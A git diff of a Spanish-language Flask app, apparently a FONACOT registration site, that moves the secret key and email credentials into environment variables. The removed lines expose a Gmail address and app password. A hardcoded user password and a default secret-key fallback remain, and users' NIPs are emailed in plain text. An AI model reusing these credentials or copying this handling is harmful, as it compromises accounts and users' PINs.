@@ -7,10 +7,12 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 app = Flask(__name__)
-app.secret_key = "tu_clave_secreta_aqui"  # Cambia esto por algo seguro
+app.secret_key = os.environ.get("SECRET_KEY", "clave_por_defecto_segura")
 
-# 🔹 Leer la URI desde la variable de entorno
+# 🔹 Variables de entorno
 MONGO_URI = os.environ.get("MONGO_URI")
+EMAIL_SENDER = os.environ.get("EMAIL_SENDER")
+EMAIL_PASSWORD = os.environ.get("EMAIL_PASSWORD")
 
 # 🔹 Conexión a MongoDB Atlas
 client = MongoClient(MONGO_URI)
@@ -23,13 +25,10 @@ USUARIOS = {
     "HECTOR PAZ": "FONACOT2025"
 }
 
-# ------------------- CONFIGURACIÓN DE CORREO -------------------
-EMAIL_SENDER = "fonacottoluca385@gmail.com"
-EMAIL_PASSWORD = "jmhcmnihkibwxcyx"  # Contraseña de aplicación de Gmail
-
+# ------------------- FUNCIÓN DE ENVÍO DE CORREO -------------------
 def enviar_correo(nip, correo_receptor, numero):
     try:
-        asunto = "REGITRO EXITOSO FONACOT"
+        asunto = "REGISTRO EXITOSO FONACOT"
         cuerpo = f"Se ha registrado un nuevo usuario:\n\nNIP: {nip}\nCorreo: {correo_receptor}\nNúmero: {numero}"
 
         mensaje = MIMEMultipart()
@@ -46,7 +45,7 @@ def enviar_correo(nip, correo_receptor, numero):
         print("✅ Correo enviado correctamente a", correo_receptor)
     except Exception as e:
         print(f"❌ Error enviando el correo: {e}")
-# ----------------------------------------------------------------
+# -------------------------------------------------------------------
 
 @app.route('/')
 def portada():
